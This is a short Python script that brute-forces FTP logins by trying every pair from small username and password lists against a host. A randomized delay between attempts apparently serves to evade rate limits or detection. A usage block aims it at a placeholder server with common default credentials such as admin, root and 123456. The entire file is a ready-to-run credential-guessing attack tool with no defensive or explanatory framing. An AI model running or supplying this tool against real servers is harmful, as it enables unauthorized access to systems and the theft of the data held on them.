import ftplib
import random
import time

def ftp_bruteforce(host, userlist, passlist):
    for user in userlist:
        for password in passlist:
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user, password)
                print(f"Success: {user}:{password}")
                ftp.quit()
                return
            except:
                print(f"Failed: {user}:{password}")
            time.sleep(random.uniform(0.1, 0.5))

# Usage
host = "ftp_server"
userlist = ["admin", "user", "root","ftpuser"]
passlist = ["password", "123456", "admin","ftppassword"]
ftp_bruteforce(host, userlist, passlist)
